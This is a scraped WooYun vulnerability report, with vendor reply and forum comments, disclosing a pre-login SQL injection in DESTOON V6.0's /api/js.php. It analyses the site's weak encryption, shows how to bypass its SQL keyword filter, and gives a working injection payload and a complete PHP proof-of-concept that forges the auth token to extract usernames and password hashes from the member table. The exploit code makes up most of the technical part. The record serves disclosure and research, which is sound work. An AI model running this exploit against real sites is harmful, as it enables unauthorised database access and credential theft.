{"id": 72055, "wybug_id": "wooyun-2015-0141905", "wybug_title": "DESTOON V6.0 (2015-09-16) 前台无需登入sql 注入一枚", "wybug_corp": "DESTOON", "wybug_author": "roker", "wybug_date": "2015-09-18 10:26", "wybug_open_date": "2015-12-17 16:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 看了一晚上。还好挖到了、涉及算法(非暴力)，以及一些sql姿势。通宵提交的漏洞，可能算法剖析那写的有点不清楚，那就重复看几遍 = =写了这么多，其实我就是想求个精华~ 详细说明：  ---------------------------------------------------------------------#1 算法剖析篇-------------相比以前 索马里的海贼 大牛破解的， 最新版的算法以及做了很大的改进。\nfunction encrypt($txt, $key = '') {\t$key or $key = DT_KEY;\t$rnd = random(32);\t$txt = $txt.substr($key, 0, 3);\t$len = strlen($txt);\t$ctr = 0;\t$str = '';\tfor($i = 0; $i < $len; $i++) {\t\t$ctr = $ctr == 32 ? 0 : $ctr;\t\t$str .= $rnd[$ctr].($txt[$i] ^ $rnd[$ctr++]);\t}\treturn str_replace(array('=', '+', '/', '0x', '0X'), array('', '-P-', '-S-', '-Z-', '-X-'), base64_encode(kecrypt($str, $key)));}function decrypt($txt, $key = '') {\t$key or $key = DT_KEY;\t$txt = kecrypt(base64_decode(str_replace(array('-P-', '-S-', '-Z-', '-X-'), array('+', '/', '0x', '0X'), $txt)), $key);\t$len = strlen($txt);\t$str = '';\tfor($i = 0; $i < $len; $i++) {\t\t$tmp = $txt[$i];\t\t$str .= $txt[++$i] ^ $tmp;\t}\treturn substr($str, -3) == substr($key, 0, 3) ? substr($str, 0, -3) : '';}function kecrypt($txt, $key) {\t$key = md5($key);\t$len = strlen($txt);\t$ctr = 0;\t$str = '';\tfor($i = 0; $i < $len; $i++) {\t\t$ctr = $ctr == 32 ? 0 : $ctr;\t\t$str .= $txt[$i] ^ $key[$ctr++];\t}\treturn $str;}\n可以看到 iv向量由原来的 $rnd = md5(microtime()) 变成了 $rnd = random(32);如果仅仅是这样的话 ，倒是可以很快逆出来的，但是，可以看到它增加了 \nreturn substr($str, -3) == substr($key, 0, 3) ? substr($str, 0, -3) : '';\n 用于判断数据的完整性。我们逆向推导下密文的还原过程。1. 首先 base64_decode(str_replace(array('-P-', '-S-', '-Z-', '-X-'), array('+', '/', '0x', '0X'), $txt) 进行特殊符号替换和base64解码。2. 带入 kecrypt.  (由于数学公式不好打 所以上传图片了- -)\n\n\n\n\n\n结论：对于密文的前N-6位，第i ，i+1 位 与其所对应的的 明文的 i 位 做异或运算(i为偶数) 结果是一个固定不变的值（Ki^Ki+1）对于密文的后6位，当两个密文的长度 与32的余数 相等时，其值不变。也就是说 ，要获取长度为x的明文所对应的密文，只要知道另一个为y的明文所对应的密文即可。其中 \n(2x+6)%32=(2y+6)%32.\n-----------------------------------------------#2 waf绕过-----------在/api/js.php中，\n<?php$_SERVER['REQUEST_URI'] = '';require '../common.inc.php';header(\"Content-type:text/javascript\");check_referer() or exit('document.write(\"<h2>Invalid Referer</h2>\");');$tag = isset($auth) ? strip_sql(decrypt($auth)) : '';$tag or exit('document.write(\"<h2>Bad Parameter</h2>\");');foreach(array($DT_PRE, '#', '$', '%', '&amp;', 'table', 'fields', 'password', 'payword', 'debug') as $v) {\tstrpos($tag, $v) === false or exit('document.write(\"<h2>Bad Parameter</h2>\");');}ob_start();tag($tag);$data = ob_get_contents();ob_clean();echo 'document.write(\\''.dwrite($data ? $data : 'No Data or Bad Parameter').'\\');';?>\n调用了，跟到 tag\nfunction tag($parameter, $expires = 0) {.....//省去无意义代码parse_str($parameter, $par);\tif(!is_array($par)) return '';\t$par = dstripslashes($par);\textract($par, EXTR_SKIP);......\t$order = $order ? ' ORDER BY '.$order : '';.......$query = \"SELECT \".$fields.\" FROM \".$table.\" WHERE \".$condition.$order.\" LIMIT \".$offset.\",\".$pagesize;\n可以看到 fields  table condition  order offset pagesize 都无单引号包裹然而由于 \nforeach(array($DT_PRE, '#', '$', '%', '&amp;', 'table', 'fields', 'password', 'payword', 'debug') as $v) {\tstrpos($tag, $v) === false or exit('document.write(\"<h2>Bad Parameter</h2>\");');\n我们只能控制 condition order offset pagesize了接下来就是绕过 strip_sql了。\nfunction strip_sql($string, $type = 1) {\t$match = array(\"/union/i\",\"/where/i\",\"/outfile/i\",\"/dumpfile/i\",\"/0x([a-f0-9]{2,})/i\",\"/select([\\s\\S]*?)from/i\",\"/select([\\s\\*\\/\\-\\(\\+@])/i\",\"/update([\\s\\*\\/\\-\\(\\+@])/i\",\"/replace([\\s\\*\\/\\-\\(\\+@])/i\",\"/delete([\\s\\*\\/\\-\\(\\+@])/i\",\"/drop([\\s\\*\\/\\-\\(\\+@])/i\",\"/load_file[\\s]*\\(/i\",\"/substring[\\s]*\\(/i\",\"/substr[\\s]*\\(/i\",\"/left[\\s]*\\(/i\",\"/concat[\\s]*\\(/i\",\"/concat_ws[\\s]*\\(/i\",\"/make_set[\\s]*\\(/i\",\"/ascii[\\s]*\\(/i\",\"/hex[\\s]*\\(/i\",\"/ord[\\s]*\\(/i\",\"/char[\\s]*\\(/i\");\t$replace = array('unio&#110;','wher&#101;','outfil&#101;','dumpfil&#101;','0&#120;\\\\1','selec&#116;\\\\1from','selec&#116;\\\\1','updat&#101;\\\\1','replac&#101;\\\\1','delet&#101;\\\\1','dro&#112;\\\\1','load_fil&#101;(','substrin&#103;(','subst&#114;(','lef&#116;(','conca&#116;(','concat_w&#115;(','make_se&#116;(','asci&#105;(','he&#120;(','or&#100;(','cha&#114;(');\tif($type) {\t\treturn is_array($string) ? array_map('strip_sql', $string) : preg_replace($match, $replace, $string);\t} else {\t\treturn str_replace(array('&#100;', '&#101;', '&#103;', '&#105;', '&#110;','&#112;', '&#114;', '&#115;', '&#116;', '&#120;'), array('d', 'e', 'g', 'i', 'n', 'p', 'r', 's', 't', 'x'), $string);\t}}\n这过滤简直可怕。 select任意字符from 以及select xxx都不行，但是注意，limit后面的$offset.\",\".$pagesize; 是拼接起来的。我们这样提交pagesize=from&offset=select xxx&moduleid=2&condition=userid=1 就可以绕过 select * from 的检测，然后 select{x(name)} 绕过 select xxx。为了方便 ，开启debug进行报错注入演示。测试的payload为\npagesize=\"!\"))}from DESTOON_MEMBER order by userid limit 1)),1)&offset=1,1 procedure analyse(extractvalue(rand(),(select{x(insert(insert(PASSWORD,1,0,username),1,0&moduleid=2&condition=userid=1\n一共 193字节。根据前面的公式 (2x+6)%32=(2y+6)%32 我们只要找一个已知明文为17字节的密文即可构造了。在 公司联系方式这个地方可以很快的找到。\n\n   漏洞证明：  填入poc。\n<?phpfunction cracked($Expressly,$Ciphertext,$str){\t$Ciphertext=str_replace(array('-P-', '-S-', '-Z-', '-X-'),array('+', '/', '0x', '0X'),$Ciphertext);\t$Ciphertext = base64_decode($Ciphertext);\t$c=strlen($Ciphertext);\t$text2=\"a\";\t$j=0;\t$s=0;\tfor($i=0;$i<strlen($str);$i++,$s++){\t\tif($j==32){$j=0;$s=0;}\t\t$tmp=$Ciphertext[$j]^$Ciphertext[$j+1];\t\t$tmp=$tmp^$Expressly[$s];\t\t$tmp=$tmp^$str[$i];\t\t$text1=$tmp^$text2;\t\t$xxoo =$xxoo.$text2.$text1;\t\t$j=$j+2;\t}\tfor($i=5;$i>=1;$i=$i-2){\t\t$tmp=$Ciphertext[$c-$i]^$Ciphertext[$c-$i-1]^'a';\t\t$xxoo = $xxoo.'a'.$tmp;\t}\techo str_replace(array('+', '/', '0x', '0X'),array('-P-', '-S-', '-Z-', '-X-'),base64_encode($xxoo));}cracked(\"1111111111@qq.com\",\"f018SggzVGUtHlo6J0ZaOg5rekJ6bnUGdQBgF1FhKURALgJiClMrTg\",'pagesize=\"!\"))}from DESTOON_MEMBER order by userid limit 1)),1)&offset=1,1 procedure analyse(extractvalue(rand(),(select{x(insert(insert(PASSWORD,1,0,username),1,0&moduleid=2&condition=userid=1');?>\n将得到的值填入auth提交/api/js.php?auth=xxx修改下 Referer 即可注入。\n\n   修复方案：  算法改下。可以参考dz的   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-09-18 16:48 厂商回复： 感谢反馈 我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-18 10:32 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这已经不是在分析漏洞了，简直就是在做数学题，最后就给系统黑了。。。    \n     2015-09-18 10:32 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:888 漏洞数:103        )\t\t \n  给爷爷跪啦    \n     2015-09-18 10:33 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:372 漏洞数:109        )\t\t \n  @疯狗 我觉得可以拿个精华的。。。狗哥您说呢。。    \n     2015-09-18 10:33 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:26        | 开发真是日了狗了)\t\t \n  mark    \n     2015-09-18 10:34 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:372 漏洞数:109        )\t\t \n  @疯狗 爱你么么哒~~    \n     2015-09-18 10:34 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  听说很6    \n     2015-09-18 10:35 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1077 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  你的rank值.....    \n     2015-09-18 10:36 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:543 漏洞数:64        | 没有我，你们就去背IP吧)\t\t \n  卧槽    \n     2015-09-18 10:38 |    \t\tf4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:7        | 有些人很牛B，一个漏洞能刷成N个。)\t\t \n  楼主的rank亮了~    \n     2015-09-18 10:39 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:372 漏洞数:109        )\t\t \n  @zeracker 嘻嘻 @301    \n     2015-09-18 10:44 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:7        | 每日必关注乌云)\t\t \n  好！中国好漏洞！我又拍桌转椅子了。    \n     2015-09-18 10:52 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:700 漏洞数:149        | 240)\t\t \n  了不得    \n     2015-09-18 11:07 |    \t\t聋子 \t\t\t( 普通白帽子  |\t\t\t        Rank:360 漏洞数:69        | 一个聋子)\t\t \n  审计牛求搞基    \n     2015-09-18 11:09 |    \t\t骑虎打狗 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:4        | 认真对待每个洞..)\t\t \n  卧槽 你的漏洞侧漏了。。    \n     2015-09-18 11:43 |    \t\t1c3z \t\t\t( 普通白帽子  |\t\t\t        Rank:258 漏洞数:53        | #)\t\t \n  吓的我赶紧点了下关注    \n     2015-09-18 12:07 |    \t\t小人物Reno \t\t\t( 普通白帽子  |\t\t\t        Rank:477 漏洞数:112        | X)\t\t \n  论大牛市怎样炼成的？求科普！详细过程。。。    \n     2015-09-18 12:21 |    \t\t有归于无 \t\t\t( 普通白帽子  |\t\t\t        Rank:100 漏洞数:20        | 有归于无)\t\t \n  妈妈问我为什么跪着看看电脑    \n     2015-09-18 12:26 |    \t\tMark0smith \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:32        | 唉)\t\t \n  吓的我赶紧点了下关注     \n     2015-09-18 12:38 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:532 漏洞数:79        | 潜心学习~~~)\t\t \n  后排关注审计牛    \n     2015-09-18 12:41 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1218 漏洞数:322        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  后排关注审计牛    \n     2015-09-18 13:37 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:387 漏洞数:48        | 答案)\t\t \n  后排关注    \n     2015-09-18 17:00 |    \t\temeditor \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 过来乌云学习 求大神别黑)\t\t \n  卧槽…明明才刚更新的6.0     \n     2015-09-18 17:04 |    \t\tSeven.Sea \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:27        | 唯有安全与美食不可辜负。)\t\t \n  看来想看懂需要一些数学功底...    \n     2015-09-18 17:14 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:838 漏洞数:107        | https://github.com/manning23/MSpider)\t\t \n  好牛逼    \n     2015-09-18 17:42 |    \t\t黑名单 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:14        | 像个傻瓜似的，为什么。)\t\t \n  吓得我赶紧公开了    \n     2015-09-18 19:06 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2015-09-19 16:02 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  后排关注审计牛    \n     2015-09-19 21:56 |    \t\t圣路西法 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 围观大神ส็็็็็็ ̷̸̨̀͒̏̃ͦ...)\t\t \n  后排关注审计牛     \n     2015-09-21 18:16 |    \t\t麦香浓郁 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 前排膜拜乌云ph m锅 凤凰 a11 dot 各种师傅)\t\t \n  肉可爷爷  原来你在这啊    \n     2015-09-22 11:32 |    \t\t路人毛 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:16        | 呵呵)\t\t \n  膜拜审计牛    \n     2015-09-22 17:50 |    \t\tAc4ary \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 404 not found 此人找不到)\t\t \n  后排关注审计牛    \n     2015-09-24 00:17 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  后排爆菊    \n     2015-09-24 09:05 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:265 漏洞数:46        )\t\t \n  膜拜    \n     2015-09-24 10:06 |    \t\tba1ma0 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 什么都不会..)\t\t \n  后排关注审计牛    \n     2015-09-24 11:26 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        )\t\t \n  审核真好。可以先睹为快……    \n     2015-09-25 15:42 |    \t\t泪雨无魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:48        )\t\t \n  后排关注     \n     2015-09-26 11:19 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:92        | 硬件与无线通信研究方向)\t\t \n  牛叉    \n     2015-10-08 10:57 |    \t\tjackzhou \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | XXX,come on X)\t\t \n  mark    \n     2015-11-23 10:13 |    \t\tSai、 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | for fun……)\t\t \n  咦？roker，是不是国庆玩了xd的？    \n     2015-11-23 17:02 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:372 漏洞数:109        )\t\t \n  @Sai、 0.0    \n     2015-11-24 09:24 |    \t\tSai、 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | for fun……)\t\t \n  @roker，跟你聊过，挺不错，哈哈……    \n     2015-11-24 13:49 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:372 漏洞数:109        )\t\t \n  @Sai、 大牛qq私我下。。我咋不记得了。。    \n     2015-12-12 22:52 |    \t\t村头小二黑 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 专x各种不服)\t\t \n  mark下，等公开    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}